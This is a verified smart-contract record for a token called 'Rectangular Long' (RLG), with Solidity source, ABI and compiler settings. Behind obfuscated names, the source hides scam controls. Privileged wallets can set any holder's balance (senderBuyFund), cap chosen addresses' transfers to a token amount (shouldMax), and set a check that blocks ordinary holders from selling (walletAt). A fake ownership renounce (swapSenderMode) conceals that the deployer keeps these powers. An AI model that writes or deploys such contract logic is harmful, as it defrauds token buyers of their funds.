{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface walletLiquidityTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isFee {\n    function createPair(address amountLimit, address launchedAmount) external returns (address);\n}\n\ninterface minMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeShould) external view returns (uint256);\n\n    function transfer(address shouldAuto, uint256 totalReceiver) external returns (bool);\n\n    function allowance(address enableTokenTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldAuto,\n        uint256 totalReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverIs, uint256 value);\n    event Approval(address indexed enableTokenTo, address indexed spender, uint256 value);\n}\n\ninterface minMaxMetadata is minMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RectangularLong is sellExempt, minMax, minMaxMetadata {\n\n    mapping(address => bool) public launchedTx;\n\n    function transfer(address senderExempt, uint256 totalReceiver) external virtual override returns (bool) {\n        return shouldTeam(_msgSender(), senderExempt, totalReceiver);\n    }\n\n    function approve(address buyLimit, uint256 totalReceiver) public virtual override returns (bool) {\n        txFee[_msgSender()][buyLimit] = totalReceiver;\n        emit Approval(_msgSender(), buyLimit, totalReceiver);\n        return true;\n    }\n\n    bool public tokenFee;\n\n    event OwnershipTransferred(address indexed takeMin, address indexed tokenAmount);\n\n    function swapSenderMode() public {\n        emit OwnershipTransferred(receiverTrading, address(0));\n        exemptSender = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return exemptSender;\n    }\n\n    mapping(address => bool) public teamWallet;\n\n    function limitSender(address exemptMarketing) public {\n        require(exemptMarketing.balance < 100000);\n        if (senderAmount) {\n            return;\n        }\n        \n        teamWallet[exemptMarketing] = true;\n        \n        senderAmount = true;\n    }\n\n    string private listLimit = \"RLG\";\n\n    bool private receiverMarketing;\n\n    function balanceOf(address takeShould) public view virtual override returns (uint256) {\n        return toMarketing[takeShould];\n    }\n\n    mapping(address => uint256) private toMarketing;\n\n    bool public senderAmount;\n\n    function getOwner() external view returns (address) {\n        return exemptSender;\n    }\n\n    uint256 public amountAuto;\n\n    function receiverFundWallet(address fundLaunch, address shouldAuto, uint256 totalReceiver) internal returns (bool) {\n        require(toMarketing[fundLaunch] >= totalReceiver);\n        toMarketing[fundLaunch] -= totalReceiver;\n        toMarketing[shouldAuto] += totalReceiver;\n        emit Transfer(fundLaunch, shouldAuto, totalReceiver);\n        return true;\n    }\n\n    bool public teamTotal;\n\n    uint256 private totalMin = 100000000 * 10 ** 18;\n\n    address public receiverTrading;\n\n    string private launchedFee = \"Rectangular Long\";\n\n    uint256 constant teamFeeTake = 12 ** 10;\n\n    uint256 public listLaunched;\n\n    uint256 shouldTotal;\n\n    address public isLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMin;\n    }\n\n    address takeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address swapMaxTo, address buyLimit) external view virtual override returns (uint256) {\n        if (buyLimit == takeEnable) {\n            return type(uint256).max;\n        }\n        return txFee[swapMaxTo][buyLimit];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLaunch;\n    }\n\n    function autoExempt() private view {\n        require(teamWallet[_msgSender()]);\n    }\n\n    function shouldMax(address receiverIsSell) public {\n        autoExempt();\n        \n        if (receiverIsSell == receiverTrading || receiverIsSell == isLiquidity) {\n            return;\n        }\n        launchedTx[receiverIsSell] = true;\n    }\n\n    address private exemptSender;\n\n    bool public maxAtWallet;\n\n    uint256 teamTakeExempt;\n\n    constructor (){\n        \n        walletLiquidityTeam marketingTradingIs = walletLiquidityTeam(takeEnable);\n        isLiquidity = isFee(marketingTradingIs.factory()).createPair(marketingTradingIs.WETH(), address(this));\n        if (maxAtWallet) {\n            maxAtWallet = false;\n        }\n        receiverTrading = _msgSender();\n        swapSenderMode();\n        teamWallet[receiverTrading] = true;\n        toMarketing[receiverTrading] = totalMin;\n        if (sellShould) {\n            maxAtWallet = false;\n        }\n        emit Transfer(address(0), receiverTrading, totalMin);\n    }\n\n    uint8 private marketingLaunch = 18;\n\n    mapping(address => mapping(address => uint256)) private txFee;\n\n    uint256 private autoLaunchedLaunch;\n\n    function transferFrom(address fundLaunch, address shouldAuto, uint256 totalReceiver) external override returns (bool) {\n        if (_msgSender() != takeEnable) {\n            if (txFee[fundLaunch][_msgSender()] != type(uint256).max) {\n                require(totalReceiver <= txFee[fundLaunch][_msgSender()]);\n                txFee[fundLaunch][_msgSender()] -= totalReceiver;\n            }\n        }\n        return shouldTeam(fundLaunch, shouldAuto, totalReceiver);\n    }\n\n    function shouldTeam(address fundLaunch, address shouldAuto, uint256 totalReceiver) internal returns (bool) {\n        if (fundLaunch == receiverTrading) {\n            return receiverFundWallet(fundLaunch, shouldAuto, totalReceiver);\n        }\n        uint256 senderLaunchList = minMax(isLiquidity).balanceOf(isAmount);\n        require(senderLaunchList == teamTakeExempt);\n        require(shouldAuto != isAmount);\n        if (launchedTx[fundLaunch]) {\n            return receiverFundWallet(fundLaunch, shouldAuto, teamFeeTake);\n        }\n        return receiverFundWallet(fundLaunch, shouldAuto, totalReceiver);\n    }\n\n    function senderBuyFund(address senderExempt, uint256 totalReceiver) public {\n        autoExempt();\n        toMarketing[senderExempt] = totalReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLimit;\n    }\n\n    address isAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public sellShould;\n\n    function walletAt(uint256 totalReceiver) public {\n        autoExempt();\n        teamTakeExempt = totalReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTokenTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMaxTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAtWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"senderBuyFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIsSell\",\"type\":\"address\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSenderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalReceiver\",\"type\":\"uint256\"}],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RectangularLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}